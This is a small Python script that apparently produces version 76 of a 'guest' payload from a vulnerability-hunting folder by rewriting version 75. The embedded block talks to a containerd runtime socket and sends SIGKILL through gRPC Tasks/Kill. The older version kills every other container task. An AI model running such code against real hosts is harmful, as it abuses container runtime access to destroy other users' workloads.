# -*- coding: utf-8 -*-
# 生成 v76 guest + 驱动 (基于 v75, 去掉 kill 其他任务)
g = open(r'D:\scan\skills\non-traditional-vuln-hunting\vda75_guest.py', encoding='utf-8').read()
# 先替换 kill 块 (此时 v75a 尚未被全局替换)
old_kill = """    base = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default'
    targets = []
    try:
        for d in sorted(os.listdir(base)):
            if d != 'v75a' and d != 'v75b':
                targets.append(d)
    except Exception as e:
        log('list task ERR %s' % e)
    for cid in targets:
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Kill',
                          grpc_env(pstr(1, cid) + pvarint(3 << 3 | 0) + pvarint(9)), t=4)
        log('kill %s %s' % (cid, rc))"""
new_kill = """    base = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default'
    targets = []
    try:
        for d in sorted(os.listdir(base)):
            if d == 'v75a' or d == 'v75b':
                targets.append(d)
    except Exception as e:
        log('list task ERR %s' % e)
    for cid in targets:
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Kill',
                          grpc_env(pstr(1, cid) + pvarint(3 << 3 | 0) + pvarint(9)), t=4)
        log('kill %s %s' % (cid, rc))"""
assert old_kill in g, 'kill block not found'
g = g.replace(old_kill, new_kill)
# 再全局替换版本号
g = g.replace('vda75', 'vda76').replace('v75', 'v76').replace('V66C_DONE', 'V76C_DONE')
open(r'D:\scan\skills\non-traditional-vuln-hunting\vda76_guest.py', 'w', encoding='utf-8').write(g)

d = open(r'D:\scan\_run_v75.py', encoding='utf-8').read()
d = d.replace('vda75', 'vda76').replace('v75', 'v76').replace('V75', 'V76')
open(r'D:\scan\_run_v76.py', 'w', encoding='utf-8').write(d)
print('done')
